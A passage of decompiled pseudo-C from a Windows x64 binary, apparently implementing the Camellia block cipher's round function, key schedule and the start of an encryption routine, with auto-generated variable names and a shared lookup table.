      LODWORD(v33) = v47 ^ dword_14011F910[(unsigned __int8)(v46 ^ v14[7])] ^ dword_14011F910[((v46 ^ (unsigned __int64)v14[7]) >> 24)
                                                                                            + 512] ^ dword_14011F910[(unsigned __int8)((unsigned __int16)(v46 ^ v14[7]) >> 8) + 256] ^ dword_14011F910[(unsigned __int8)((v46 ^ v14[7]) >> 16) + 768];
      v48 = v33 ^ v42;
      v49 = v33 ^ ((v47 >> 8) + (v47 << 24)) ^ v43;
      v50 = dword_14011F910[(unsigned __int8)(v48 ^ v14[4]) + 256] ^ dword_14011F910[(v48 ^ (unsigned __int64)v14[4]) >> 24] ^ dword_14011F910[(unsigned __int8)((unsigned __int16)(v48 ^ v14[4]) >> 8) + 768] ^ dword_14011F910[(unsigned __int8)((v48 ^ v14[4]) >> 16) + 512];
      LODWORD(v33) = v50 ^ dword_14011F910[(unsigned __int8)(v49 ^ v14[5])] ^ dword_14011F910[((v49 ^ (unsigned __int64)v14[5]) >> 24)
                                                                                            + 512] ^ dword_14011F910[(unsigned __int8)((unsigned __int16)(v49 ^ v14[5]) >> 8) + 256] ^ dword_14011F910[(unsigned __int8)((v49 ^ v14[5]) >> 16) + 768];
      v51 = v33 ^ v45;
      v52 = v33 ^ ((v50 >> 8) + (v50 << 24)) ^ v46;
      v53 = dword_14011F910[(unsigned __int8)(v51 ^ v14[2]) + 256] ^ dword_14011F910[(v51 ^ (unsigned __int64)v14[2]) >> 24] ^ dword_14011F910[(unsigned __int8)((unsigned __int16)(v51 ^ v14[2]) >> 8) + 768] ^ dword_14011F910[(unsigned __int8)((v51 ^ v14[2]) >> 16) + 512];
      LODWORD(v33) = v53 ^ dword_14011F910[(unsigned __int8)(v52 ^ v14[3])] ^ dword_14011F910[((v52 ^ (unsigned __int64)v14[3]) >> 24)
                                                                                            + 512] ^ dword_14011F910[(unsigned __int8)((unsigned __int16)(v52 ^ v14[3]) >> 8) + 256] ^ dword_14011F910[(unsigned __int8)((v52 ^ v14[3]) >> 16) + 768];
      v28 = v33 ^ v48;
      v29 = v33 ^ ((v53 >> 8) + (v53 << 24)) ^ v49;
      v54 = dword_14011F910[(unsigned __int8)(v28 ^ *v14) + 256] ^ dword_14011F910[(v28 ^ (unsigned __int64)*v14) >> 24] ^ dword_14011F910[(unsigned __int8)((unsigned __int16)(v28 ^ *v14) >> 8) + 768] ^ dword_14011F910[(unsigned __int8)((v28 ^ *v14) >> 16) + 512];
      LODWORD(v33) = v54 ^ dword_14011F910[(unsigned __int8)(v29 ^ v14[1])] ^ dword_14011F910[((v29 ^ (unsigned __int64)v14[1]) >> 24)
                                                                                            + 512] ^ dword_14011F910[(unsigned __int8)((unsigned __int16)(v29 ^ v14[1]) >> 8) + 256] ^ dword_14011F910[(unsigned __int8)((v29 ^ v14[1]) >> 16) + 768];
      v31 = v33 ^ v51;
      v32 = v33 ^ ((v54 >> 8) + (v54 << 24)) ^ v52;
    }
    while ( v14 != v4 );
  }
  v55 = *(v14 - 4) ^ v28;
  v56 = *(v14 - 2) ^ v31;
  v57 = *(v14 - 1) ^ v32;
  v58 = *(v14 - 3) ^ v29;
  *a4 = HIBYTE(v55);
  a4[1] = BYTE2(v55);
  a4[2] = BYTE1(v55);
  a4[4] = HIBYTE(v58);
  a4[5] = BYTE2(v58);
  a4[6] = BYTE1(v58);
  a4[8] = HIBYTE(v56);
  a4[9] = BYTE2(v56);
  a4[10] = BYTE1(v56);
  a4[12] = HIBYTE(v57);
  a4[13] = BYTE2(v57);
  a4[3] = v55;
  a4[11] = v56;
  a4[15] = v57;
  result = v57 >> 8;
  a4[14] = BYTE1(v57);
  a4[7] = v58;
  return result;
}
// 14011F910: using guessed type _DWORD dword_14011F910[1036];

//----- (00000001400B4B60) ----------------------------------------------------
__int64 __fastcall sub_1400B4B60(int a1, unsigned __int8 *a2, unsigned int *a3)
{
  unsigned int v4; // r12d
  unsigned int v5; // r13d
  int v6; // r15d
  int v7; // ebp
  int v8; // r12d
  int v9; // r13d
  int v10; // r15d
  int v11; // ebp
  unsigned int v12; // edi
  unsigned int v13; // esi
  unsigned int v14; // r10d
  int v15; // r9d
  unsigned int v16; // r15d
  unsigned int v17; // ebp
  unsigned int v18; // r10d
  int v19; // r9d
  unsigned int v20; // r12d
  unsigned int v21; // r13d
  unsigned int v22; // r10d
  int v23; // r9d
  unsigned int v24; // ebx
  unsigned int v25; // r15d
  unsigned int v26; // ebp
  unsigned int v27; // r10d
  int v28; // r8d
  unsigned int v29; // r12d
  unsigned int v30; // r13d
  unsigned int v31; // r8d
  unsigned int v32; // ecx
  unsigned int v33; // r11d
  unsigned int v34; // ebp
  unsigned int v35; // r8d
  unsigned int v36; // r11d
  unsigned int v37; // r13d
  int v38; // r10d
  unsigned int v39; // r12d
  unsigned int v40; // r9d
  unsigned int v41; // ebp
  unsigned int v42; // eax
  unsigned int v43; // r10d
  unsigned int v44; // ecx
  unsigned int v45; // r9d
  unsigned int v46; // ebp
  int v47; // r8d
  int v48; // r10d
  unsigned int v49; // edx
  unsigned int v50; // ebp
  unsigned int v51; // ecx
  int v52; // r9d
  unsigned int v53; // r8d
  unsigned int v54; // eax
  unsigned int v55; // r10d
  unsigned int v56; // edx
  unsigned int v57; // ecx
  unsigned int v58; // r9d
  unsigned int v59; // ebx
  unsigned int v60; // r8d
  unsigned int v61; // r9d
  int v62; // edx
  unsigned int v63; // edx
  unsigned int v64; // r8d
  unsigned int v65; // r9d
  unsigned int v66; // ebx
  unsigned int v67; // eax
  unsigned int v68; // ecx
  unsigned int v69; // edx
  unsigned int v70; // r8d
  unsigned int v71; // ebx
  unsigned int v72; // eax
  unsigned int v73; // r9d
  unsigned int v74; // ecx
  unsigned int v75; // edx
  unsigned int v76; // ebx
  unsigned int v77; // eax
  unsigned int v78; // r8d
  unsigned int v79; // r10d
  unsigned int v80; // r9d
  unsigned int v81; // ebx
  unsigned int v82; // ebx
  __int64 result; // rax
  unsigned int v84; // ebx
  unsigned int v85; // edi
  unsigned int v86; // esi
  unsigned int v87; // r12d
  unsigned int v88; // r13d
  int v89; // r10d
  unsigned int v90; // r10d
  unsigned int v91; // r11d
  int v92; // r9d
  unsigned int v93; // r15d
  unsigned int v94; // ebp
  unsigned int v95; // r10d
  int v96; // r8d
  int v97; // r8d
  int v98; // r8d
  int v99; // r12d
  unsigned int v100; // ecx
  unsigned int v101; // r13d
  int v102; // r12d
  unsigned int v103; // r13d
  unsigned int v104; // r15d
  unsigned int v105; // ebp
  unsigned int v106; // ecx
  unsigned int v107; // r12d
  unsigned int v108; // r13d
  unsigned int v109; // r15d
  unsigned int v110; // ebp
  unsigned int v111; // r8d
  unsigned int v112; // r10d
  unsigned int v113; // ecx
  unsigned int v114; // esi
  unsigned int v115; // r8d
  unsigned int v116; // r11d
  unsigned int v117; // r9d
  unsigned int v118; // r11d
  unsigned int v119; // ecx
  unsigned int v120; // r11d
  unsigned int v121; // r10d
  unsigned int v122; // r9d
  unsigned int v123; // r10d
  unsigned int v124; // esi
  unsigned int v125; // ecx
  unsigned int v126; // edx
  unsigned int v127; // r8d
  unsigned int v128; // r10d
  unsigned int v129; // r11d
  unsigned int v130; // r9d
  unsigned int v131; // ebx
  unsigned int v132; // r10d
  unsigned int v133; // ecx
  unsigned int v134; // ebx
  unsigned int v135; // r11d
  unsigned int v136; // r9d
  unsigned int v137; // r10d
  unsigned int v138; // r11d
  unsigned int v139; // ecx
  int v140; // eax
  unsigned int v141; // r9d
  int v142; // r11d
  int v143; // ebx
  unsigned int v144; // ecx
  unsigned int v145; // r11d
  unsigned int v146; // edx
  unsigned int v147; // r8d
  unsigned int v148; // ebx
  unsigned int v149; // r11d
  unsigned int v150; // ebx
  unsigned int v151; // eax
  unsigned int v152; // ebx
  unsigned int v153; // r9d
  unsigned int v154; // r10d
  unsigned int v155; // r11d
  unsigned int v156; // r8d
  unsigned int v157; // r11d
  unsigned int v158; // r10d

  v4 = a2[3] ^ ((a2[2] ^ ((a2[1] ^ (*a2 << 8)) << 8)) << 8);
  *a3 = v4;
  v5 = a2[7] ^ ((a2[6] ^ ((a2[5] ^ (a2[4] << 8)) << 8)) << 8);
  a3[1] = v5;
  v6 = a2[11] ^ ((a2[10] ^ ((a2[9] ^ (a2[8] << 8)) << 8)) << 8);
  a3[2] = v6;
  v7 = a2[15] ^ ((a2[14] ^ ((a2[13] ^ (a2[12] << 8)) << 8)) << 8);
  a3[3] = v7;
  if ( a1 != 128 )
  {
    v8 = a2[19] ^ ((a2[18] ^ ((a2[17] ^ (a2[16] << 8)) << 8)) << 8);
    a3[8] = v8;
    v9 = a2[23] ^ ((a2[22] ^ ((a2[21] ^ (a2[20] << 8)) << 8)) << 8);
    a3[9] = v9;
    if ( a1 == 192 )
    {
      v10 = ~v8;
      v11 = ~v9;
      a3[10] = ~v8;
    }
    else
    {
      v10 = a2[27] ^ ((a2[26] ^ ((a2[25] ^ (a2[24] << 8)) << 8)) << 8);
      a3[10] = v10;
      v11 = a2[31] ^ ((a2[30] ^ ((a2[29] ^ (a2[28] << 8)) << 8)) << 8);
    }
    v4 = *a3 ^ v8;
    v5 = a3[1] ^ v9;
    v6 = a3[2] ^ v10;
    a3[11] = v11;
    v7 = a3[3] ^ v11;
  }
  v12 = *a3;
  v13 = a3[1];
  v14 = dword_14011F910[((unsigned __int8)v4 ^ 0x7F) + 256] ^ dword_14011F910[(v4 ^ 0xA09E667Fui64) >> 24] ^ dword_14011F910[(unsigned __int8)((unsigned __int16)(v4 ^ 0x667F) >> 8) + 768] ^ dword_14011F910[(unsigned __int8)((v4 ^ 0xA09E667F) >> 16) + 512];
  v15 = v14 ^ dword_14011F910[(unsigned __int8)v5 ^ 0x8B] ^ dword_14011F910[((v5 ^ 0x3BCC908Bui64) >> 24) + 512] ^ dword_14011F910[(unsigned __int8)((unsigned __int16)(v5 ^ 0x908B) >> 8) + 256] ^ dword_14011F910[(unsigned __int8)((v5 ^ 0x3BCC908B) >> 16) + 768];
  v16 = v15 ^ v6;
  v17 = v15 ^ ((v14 >> 8) + (v14 << 24)) ^ v7;
  v18 = dword_14011F910[((unsigned __int8)v16 ^ 0x58) + 256] ^ dword_14011F910[(v16 ^ 0xB67AE858ui64) >> 24] ^ dword_14011F910[(unsigned __int8)((unsigned __int16)(v16 ^ 0xE858) >> 8) + 768] ^ dword_14011F910[(unsigned __int8)((v16 ^ 0xB67AE858) >> 16) + 512];
  v19 = v18 ^ dword_14011F910[(unsigned __int8)v17 ^ 0xB2] ^ dword_14011F910[((v17 ^ 0x4CAA73B2ui64) >> 24) + 512] ^ dword_14011F910[(unsigned __int8)((unsigned __int16)(v17 ^ 0x73B2) >> 8) + 256] ^ dword_14011F910[(unsigned __int8)((v17 ^ 0x4CAA73B2) >> 16) + 768];
  v20 = v19 ^ *a3 ^ v4;
  v21 = v19 ^ v13 ^ ((v18 >> 8) + (v18 << 24)) ^ v5;
  v22 = dword_14011F910[((unsigned __int8)v20 ^ 0x2F) + 256] ^ dword_14011F910[(v20 ^ 0xC6EF372Fui64) >> 24] ^ dword_14011F910[(unsigned __int8)((unsigned __int16)(v20 ^ 0x372F) >> 8) + 768] ^ dword_14011F910[(unsigned __int8)((v20 ^ 0xC6EF372F) >> 16) + 512];
  v23 = v22 ^ dword_14011F910[(unsigned __int8)v21 ^ 0xBE] ^ dword_14011F910[((v21 ^ 0xE94F82BEui64) >> 24) + 512] ^ dword_14011F910[(unsigned __int8)((unsigned __int16)(v21 ^ 0x82BE) >> 8) + 256] ^ dword_14011F910[(unsigned __int8)((v21 ^ 0xE94F82BE) >> 16) + 768];
  v24 = a3[3];
  v25 = v23 ^ a3[2] ^ v16;
  v26 = v23 ^ v24 ^ ((v22 >> 8) + (v22 << 24)) ^ v17;
  v27 = dword_14011F910[((unsigned __int8)v25 ^ 0xA5) + 256] ^ dword_14011F910[(v25 ^ 0x54FF53A5ui64) >> 24] ^ dword_14011F910[(unsigned __int8)((unsigned __int16)(v25 ^ 0x53A5) >> 8) + 768] ^ dword_14011F910[(unsigned __int8)((v25 ^ 0x54FF53A5) >> 16) + 512];
  v28 = v27 ^ dword_14011F910[(unsigned __int8)v26 ^ 0x1C] ^ dword_14011F910[((v26 ^ 0xF1D36F1Cui64) >> 24) + 512] ^ dword_14011F910[(unsigned __int8)((unsigned __int16)(v26 ^ 0x6F1C) >> 8) + 256] ^ dword_14011F910[(unsigned __int8)((v26 ^ 0xF1D36F1C) >> 16) + 768];
  v29 = v28 ^ v20;
  v30 = v28 ^ ((v27 >> 8) + (v27 << 24)) ^ v21;
  if ( a1 == 128 )
  {
    v31 = v26;
    a3[7] = v26;
    v32 = v30 >> 17;
    v33 = (v29 >> 17) | (v26 << 15);
    a3[15] = v33;
    v34 = v33 << 15;
    a3[6] = v25;
    v35 = (v25 << 15) | (v31 >> 17);
    a3[5] = v30;
    a3[14] = v35;
    v36 = (v35 << 15) | (v33 >> 17);
    v37 = v30 << 15;
    a3[4] = v29;
    a3[13] = v37 | (v25 >> 17);
    v38 = ((v37 | (v25 >> 17)) << 15) | (v35 >> 17);
    a3[17] = v38;
    v39 = v29 << 15;
    a3[18] = v36;
    a3[12] = v39 | v32;
    v40 = ((v39 | v32) << 15) | ((v37 | (v25 >> 17)) >> 17);
    v41 = ((v39 | v32) >> 17) | v34;
    a3[16] = v40;
    v42 = v40;
    a3[19] = v41;
    v43 = (v38 << 15) | (v36 >> 17);
    a3[25] = v43;
    v44 = (v40 << 15) | ((((v37 | (v25 >> 17)) << 15) | (v35 >> 17)) >> 17);
    v45 = (v36 << 15) | (v41 >> 17);
    v46 = (v42 >> 17) | (v41 << 15);
    a3[24] = v44;
    v47 = (v43 << 15) | (v45 >> 17);
    v48 = (v44 << 15) | (v43 >> 17);
    v49 = (v45 << 15) | (v46 >> 17);
    v50 = (v44 >> 17) | (v46 << 15);
    a3[30] = v49;
    a3[28] = v48;
    a3[29] = v47;
    a3[31] = v50;
    v51 = v47;
    v52 = (4 * v47) | (v49 >> 30);
    v53 = (4 * v49) | (v50 >> 30);
    a3[40] = v52;
    a3[41] = v53;
    v54 = v48;
    v55 = (v51 >> 30) | (4 * v48);
    v56 = (v54 >> 30) | (4 * v50);
    a3[43] = v55;
    a3[42] = v56;
    v57 = v52;
    a3[48] = (v52 << 17) | (v53 >> 15);
    a3[49] = (v53 << 17) | (v56 >> 15);
    v58 = v24 >> 17;
    a3[50] = (v55 >> 15) | (v56 << 17);
    v59 = (v12 >> 17) | (v24 << 15);
    v60 = (v13 << 15) | (a3[2] >> 17);
    v61 = (a3[2] << 15) | v58;
    v62 = (v12 << 15) | (v13 >> 17);
    a3[9] = v60;
    a3[8] = v62;
    v63 = (v60 >> 2) | (v62 << 30);
    a3[10] = v61;
    v64 = (v61 >> 2) | (v60 << 30);
    a3[11] = v59;
    v65 = (v59 >> 2) | (v61 << 30);
    v66 = (((v12 << 15) | (v13 >> 17)) >> 2) | (v59 << 30);
    a3[22] = v65;
    a3[51] = (v57 >> 15) | (v55 << 17);
    a3[20] = v63;
    a3[21] = v64;
    a3[23] = v66;
    v67 = v63 >> 17;
    v68 = (v63 << 15) | (v64 >> 17);
    v69 = (v64 << 15) | (v65 >> 17);
    v70 = (v65 << 15) | (v66 >> 17);
    v71 = v67 | (v66 << 15);
    a3[26] = v70;
    a3[27] = v71;
    v72 = v68 >> 15;
    v73 = (v68 << 17) | (v69 >> 15);
    v74 = (v69 << 17) | (v70 >> 15);
    a3[32] = v73;
    v75 = (v70 << 17) | (v71 >> 15);
    v76 = v72 | (v71 << 17);
    a3[33] = v74;
    a3[35] = v76;
    v77 = v73 >> 15;
    v78 = (v73 << 17) | (v74 >> 15);
    a3[34] = v75;
    v79 = (v75 << 17) | (v76 >> 15);
    v80 = (v74 << 17) | (v75 >> 15);
    v81 = v77 | (v76 << 17);
    a3[37] = v80;
    a3[39] = v81;
    a3[45] = (v80 << 17) | (v79 >> 15);
    a3[38] = v79;
    a3[36] = v78;
    a3[46] = (v79 << 17) | (v81 >> 15);
    v82 = (v78 >> 15) | (v81 << 17);
    result = 3i64;
    a3[44] = (v78 << 17) | (v80 >> 15);
  }
  else
  {
    v84 = a3[8];
    v85 = a3[9];
    v86 = a3[11];
    a3[12] = v29;
    v87 = v84 ^ v29;
    a3[13] = v30;
    a3[14] = v25;
    v88 = v85 ^ v30;
    v89 = dword_14011F910[(unsigned __int8)((v87 ^ 0x10E527FA) >> 16) + 512];
    a3[15] = v26;
    v90 = dword_14011F910[((unsigned __int8)v87 ^ 0xFA) + 256] ^ dword_14011F910[(v87 ^ 0x10E527FAui64) >> 24] ^ dword_14011F910[(unsigned __int8)((unsigned __int16)(v87 ^ 0x27FA) >> 8) + 768] ^ v89;
    v91 = a3[10];
    v92 = v90 ^ dword_14011F910[(unsigned __int8)v88 ^ 0x1D] ^ dword_14011F910[((v88 ^ 0xDE682D1Dui64) >> 24) + 512] ^ dword_14011F910[(unsigned __int8)((unsigned __int16)(v88 ^ 0x2D1D) >> 8) + 256] ^ dword_14011F910[(unsigned __int8)((v88 ^ 0xDE682D1D) >> 16) + 768];
    v93 = v92 ^ v91 ^ v25;
    v94 = v92 ^ v86 ^ ((v90 >> 8) + (v90 << 24)) ^ v26;
    v95 = dword_14011F910[((unsigned __int8)v93 ^ 0xC2) + 256] ^ dword_14011F910[(v93 ^ 0xB05688C2ui64) >> 24] ^ dword_14011F910[(unsigned __int8)((unsigned __int16)(v93 ^ 0x88C2) >> 8) + 768] ^ dword_14011F910[(unsigned __int8)((v93 ^ 0xB05688C2) >> 16) + 512];
    v96 = dword_14011F910[(unsigned __int8)((v94 ^ 0xB3E6C1FD) >> 16) + 768];
    a3[7] = v94;
    v97 = dword_14011F910[(unsigned __int8)((unsigned __int16)(v94 ^ 0xC1FD) >> 8) + 256] ^ v96;
    a3[6] = v93;
    v98 = v95 ^ dword_14011F910[(unsigned __int8)v94 ^ 0xFD] ^ dword_14011F910[((v94 ^ 0xB3E6C1FDui64) >> 24) + 512] ^ v97;
    v99 = v98 ^ v87;
    a3[4] = v99;
    v100 = v99;
    v101 = v98 ^ ((v95 >> 8) + (v95 << 24)) ^ v88;
    v102 = (v101 >> 2) | (v99 << 30);
    a3[5] = v101;
    v103 = (v93 >> 2) | (v101 << 30);
    a3[20] = v102;
    v104 = (v94 >> 2) | (v93 << 30);
    v105 = (v100 >> 2) | (v94 << 30);
    a3[21] = v103;
    v106 = v102;
    a3[23] = v105;
    v107 = (v103 >> 2) | (v102 << 30);
    v108 = (v104 >> 2) | (v103 << 30);
    a3[22] = v104;
    v109 = (v105 >> 2) | (v104 << 30);
    v110 = (v106 >> 2) | (v105 << 30);
    a3[40] = v107;
    a3[43] = v110;
    a3[41] = v108;
    a3[42] = v109;
    a3[64] = (v108 << 19) | (v109 >> 13);
    a3[65] = (v109 << 19) | (v110 >> 13);
    a3[66] = (v107 >> 13) | (v110 << 19);
    a3[67] = (v108 >> 13) | (v107 << 19);
    v111 = v86;
    v112 = (v84 >> 17) | (v86 << 15);
    a3[11] = v112;
    v113 = (v84 << 15) | (v85 >> 17);
    a3[8] = v113;
    v114 = (v113 >> 17) | (v112 << 15);
    v115 = (v91 << 15) | (v111 >> 17);
    a3[19] = v114;
    v116 = (v85 << 15) | (v91 >> 17);
    a3[9] = v116;
    v117 = (v116 << 15) | (v115 >> 17);
    v118 = (v113 << 15) | (v116 >> 17);
    a3[17] = v117;
    a3[16] = v118;
    v119 = v118 >> 2;
    v120 = (v117 >> 2) | (v118 << 30);
    a3[10] = v115;
    v121 = (v115 << 15) | (v112 >> 17);
    a3[36] = v120;
    a3[18] = v121;
    v122 = (v121 >> 2) | (v117 << 30);
    a3[37] = v122;
    v123 = (v114 >> 2) | (v121 << 30);
    v124 = v119 | (v114 << 30);
    a3[38] = v123;
    a3[39] = v124;
    a3[52] = (4 * v122) | (v123 >> 30);
    a3[53] = (4 * v123) | (v124 >> 30);
    a3[54] = (v120 >> 30) | (4 * v124);
    v125 = a3[13];
    v126 = a3[14];
    a3[55] = ((unsigned __int64)v122 >> 30) | (4 * v120);
    v127 = a3[12];
    v128 = a3[15];
    v129 = v128 << 15;
    v130 = (v125 << 15) | (v126 >> 17);
    v131 = (v127 << 15) | (v125 >> 17);
    v132 = (v126 << 15) | (v128 >> 17);
    a3[12] = v131;
    v133 = v131 >> 2;
    v134 = (v130 >> 2) | (v131 << 30);
    v135 = (v127 >> 17) | v129;
    a3[13] = v130;
    a3[15] = v135;
    v136 = (v132 >> 2) | (v130 << 30);
    a3[14] = v132;
    v137 = (v135 >> 2) | (v132 << 30);
    v138 = v133 | (v135 << 30);
    a3[29] = v136;
    a3[31] = v138;
    a3[50] = v138;
    v139 = v136 >> 15;
    a3[48] = v136;
    v140 = (v136 << 17) | (v137 >> 15);
    a3[28] = v134;
    v141 = a3[2];
    a3[56] = v140;
    a3[51] = v134;
    a3[30] = v137;
    a3[49] = v137;
    a3[57] = (v137 << 17) | (v138 >> 15);
    v142 = (v134 >> 15) | (v138 << 17);
    v143 = v139 | (v134 << 17);
    v144 = a3[1];
    a3[58] = v142;
    v145 = a3[3];
    v146 = (v144 << 13) | (v141 >> 19);
    v147 = (v141 << 13) | (v145 >> 19);
    a3[59] = v143;
    v148 = *a3;
    v149 = (*a3 >> 19) | (v145 << 13);
    a3[24] = v146;
    v150 = (v144 >> 19) | (v148 << 13);
    a3[26] = v149;
    a3[25] = v147;
    v151 = v150 >> 17;
    a3[27] = v150;
    v152 = (v146 >> 17) | (v150 << 15);
    v153 = (v146 << 15) | (v147 >> 17);
    a3[35] = v152;
    a3[32] = v153;
    v154 = (v147 << 15) | (v149 >> 17);
    v155 = v151 | (v149 << 15);
    a3[33] = v154;
    v156 = (v154 << 17) | (v155 >> 15);
    a3[34] = v155;
    v157 = (v152 >> 15) | (v155 << 17);
    v82 = (v153 >> 15) | (v152 << 17);
    v158 = (v153 << 17) | (v154 >> 15);
    a3[44] = v158;
    a3[45] = v156;
    a3[60] = (4 * v156) | (v157 >> 30);
    a3[46] = v157;
    a3[61] = (v82 >> 30) | (4 * v157);
    a3[62] = (4 * v82) | (v158 >> 30);
    a3[63] = (v156 >> 30) | (4 * v158);
    result = 4i64;
  }
  a3[47] = v82;
  return result;
}
// 14011F910: using guessed type _DWORD dword_14011F910[1036];

//----- (00000001400B5930) ----------------------------------------------------
__int64 __fastcall sub_1400B5930(int a1, unsigned __int8 *a2, _DWORD *a3, _BYTE *a4)
{
  _DWORD *v4; // rbx
  unsigned __int64 v5; // r10
  _DWORD *v6; // r15
  unsigned int v7; // edi
  unsigned int v8; // ebp
  int v9; // esi
  int v10; // r14d
  unsigned __int64 v11; // r8
  unsigned int v12; // r11d
  unsigned int v13; // esi
  unsigned int v14; // r14d
  unsigned int v15; // r11d
  unsigned int v16; // edi
  unsigned int v17; // ebp
  unsigned int v18; // r11d
  unsigned int v19; // esi
  unsigned int v20; // r14d
  unsigned int v21; // r11d
  unsigned int v22; // edi
  unsigned int v23; // ebp
  unsigned int v24; // r11d
  unsigned int v25; // esi
  unsigned __int64 v26; // r10
  int v27; // eax
  unsigned __int64 v28; // r8
  unsigned int v29; // r14d
  _DWORD *v30; // rbx
  unsigned int v31; // r11d
  unsigned int v32; // edi
  int i; // ebp
  unsigned int v34; // ebp
  unsigned int v35; // esi
  unsigned int v36; // edi
  int v37; // r14d
  unsigned int v38; // r11d
  int v39; // r8d
  unsigned int v40; // esi
  unsigned int v41; // r14d
  unsigned int v42; // r11d
  int v43; // r8d
  unsigned int v44; // edi
  unsigned int v45; // ebp
  unsigned int v46; // r11d
  int v47; // r8d
  unsigned int v48; // esi
  unsigned int v49; // r14d
  unsigned int v50; // r11d
  int v51; // r8d
  unsigned int v52; // edi
  unsigned int v53; // ebp
  unsigned int v54; // r11d
  int v55; // r8d
  unsigned int v56; // r11d
  unsigned __int64 v57; // r10
  int v58; // eax
  int v59; // r8d
  int v60; // esi
  int v61; // edi
  unsigned int v62; // ebp
  int v63; // r14d
  __int64 result; // rax

  v4 = a3 + 4;
  v5 = (unsigned int)a3[5];
  v6 = &a3[16 * a1];
  v7 = *a3 ^ a2[3] ^ ((a2[2] ^ ((a2[1] ^ (*a2 << 8)) << 8)) << 8);
  v8 = a3[1] ^ a2[7] ^ ((a2[6] ^ ((a2[5] ^ (a2[4] << 8)) << 8)) << 8);
  v9 = a3[2] ^ a2[11] ^ ((a2[10] ^ ((a2[9] ^ (a2[8] << 8)) << 8)) << 8);
  v10 = a3[3] ^ a2[15] ^ ((a2[14] ^ ((a2[13] ^ (a2[12] << 8)) << 8)) << 8);
  v11 = v7 ^ (unsigned __int64)(unsigned int)a3[4];
  v12 = dword_14011F910[(unsigned __int8)v11 + 256] ^ dword_14011F910[v11 >> 24] ^ dword_14011F910[BYTE1(v11) + 768] ^ dword_14011F910[BYTE2(v11) + 512];
  LODWORD(v11) = v12 ^ dword_14011F910[(unsigned __int8)(v8 ^ v5)] ^ dword_14011F910[((v8 ^ v5) >> 24) + 512] ^ dword_14011F910[(unsigned __int8)((unsigned __int16)(v8 ^ v5) >> 8) + 256] ^ dword_14011F910[(unsigned __int8)((v8 ^ (unsigned int)v5) >> 16) + 768];
  v13 = v11 ^ v9;
  v14 = v11 ^ ((v12 >> 8) + (v12 << 24)) ^ v10;
  v15 = dword_14011F910[(unsigned __int8)(v13 ^ v4[2]) + 256] ^ dword_14011F910[(v13 ^ (unsigned __int64)(unsigned int)v4[2]) >> 24] ^ dword_14011F910[(unsigned __int8)((unsigned __int16)(v13 ^ v4[2]) >> 8) + 768] ^ dword_14011F910[(unsigned __int8)((v13 ^ v4[2]) >> 16) + 512];
  LODWORD(v11) = v15 ^ dword_14011F910[(unsigned __int8)(v14 ^ v4[3])] ^ dword_14011F910[((v14 ^ (unsigned __int64)(unsigned int)v4[3]) >> 24)
                                                                                       + 512] ^ dword_14011F910[(unsigned __int8)((unsigned __int16)(v14 ^ v4[3]) >> 8) + 256] ^ dword_14011F910[(unsigned __int8)((v14 ^ v4[3]) >> 16) + 768];
  v16 = v11 ^ v7;
  v17 = v11 ^ ((v15 >> 8) + (v15 << 24)) ^ v8;
  v18 = dword_14011F910[(unsigned __int8)(v16 ^ v4[4]) + 256] ^ dword_14011F910[(v16 ^ (unsigned __int64)(unsigned int)v4[4]) >> 24] ^ dword_14011F910[(unsigned __int8)((unsigned __int16)(v16 ^ v4[4]) >> 8) + 768] ^ dword_14011F910[(unsigned __int8)((v16 ^ v4[4]) >> 16) + 512];
  LODWORD(v11) = v18 ^ dword_14011F910[(unsigned __int8)(v17 ^ v4[5])] ^ dword_14011F910[((v17 ^ (unsigned __int64)(unsigned int)v4[5]) >> 24)
                                                                                       + 512] ^ dword_14011F910[(unsigned __int8)((unsigned __int16)(v17 ^ v4[5]) >> 8) + 256] ^ dword_14011F910[(unsigned __int8)((v17 ^ v4[5]) >> 16) + 768];
  v19 = v11 ^ v13;
  v20 = v11 ^ ((v18 >> 8) + (v18 << 24)) ^ v14;
  v21 = dword_14011F910[(unsigned __int8)(v19 ^ v4[6]) + 256] ^ dword_14011F910[(v19 ^ (unsigned __int64)(unsigned int)v4[6]) >> 24] ^ dword_14011F910[(unsigned __int8)((unsigned __int16)(v19 ^ v4[6]) >> 8) + 768] ^ dword_14011F910[(unsigned __int8)((v19 ^ v4[6]) >> 16) + 512];
  LODWORD(v11) = v21 ^ dword_14011F910[(unsigned __int8)(v20 ^ v4[7])] ^ dword_14011F910[((v20 ^ (unsigned __int64)(unsigned int)v4[7]) >> 24)
                                                                                       + 512] ^ dword_14011F910[(unsigned __int8)((unsigned __int16)(v20 ^ v4[7]) >> 8) + 256] ^ dword_14011F910[(unsigned __int8)((v20 ^ v4[7]) >> 16) + 768];
  v22 = v11 ^ v16;
  v23 = v11 ^ ((v21 >> 8) + (v21 << 24)) ^ v17;
  v24 = dword_14011F910[(unsigned __int8)(v22 ^ v4[8]) + 256] ^ dword_14011F910[(v22 ^ (unsigned __int64)(unsigned int)v4[8]) >> 24] ^ dword_14011F910[(unsigned __int8)((unsigned __int16)(v22 ^ v4[8]) >> 8) + 768] ^ dword_14011F910[(unsigned __int8)((v22 ^ v4[8]) >> 16) + 512];
  LODWORD(v11) = v24 ^ dword_14011F910[(unsigned __int8)(v23 ^ v4[9])] ^ dword_14011F910[((v23 ^ (unsigned __int64)(unsigned int)v4[9]) >> 24)
                                                                                       + 512] ^ dword_14011F910[(unsigned __int8)((unsigned __int16)(v23 ^ v4[9]) >> 8) + 256] ^ dword_14011F910[(unsigned __int8)((v23 ^ v4[9]) >> 16) + 768];
  v25 = v11 ^ v19;
  v26 = (unsigned int)v4[11];
  v27 = v11 ^ ((v24 >> 8) + (v24 << 24));
  v28 = (unsigned int)v4[10];
  v29 = v27 ^ v20;
  v30 = v4 + 12;
  v31 = dword_14011F910[(unsigned __int8)(v25 ^ v28) + 256] ^ dword_14011F910[(v25 ^ v28) >> 24] ^ dword_14011F910[(unsigned __int8)((unsigned __int16)(v25 ^ v28) >> 8) + 768] ^ dword_14011F910[(unsigned __int8)((v25 ^ (unsigned int)v28) >> 16) + 512];
  LODWORD(v28) = v31 ^ dword_14011F910[(unsigned __int8)(v29 ^ v26)] ^ dword_14011F910[((v29 ^ v26) >> 24) + 512] ^ dword_14011F910[(unsigned __int8)((unsigned __int16)(v29 ^ v26) >> 8) + 256] ^ dword_14011F910[(unsigned __int8)((v29 ^ (unsigned int)v26) >> 16) + 768];
  v32 = v28 ^ v22;
  for ( i = v28 ^ ((v31 >> 8) + (v31 << 24)) ^ v23; v30 != v6; i = v59 ^ ((v56 >> 8) + (v56 << 24)) ^ v53 )
  {
    v34 = (((v32 >> 31) & (*v30 >> 31)) + 2 * (v32 & *v30)) ^ i;
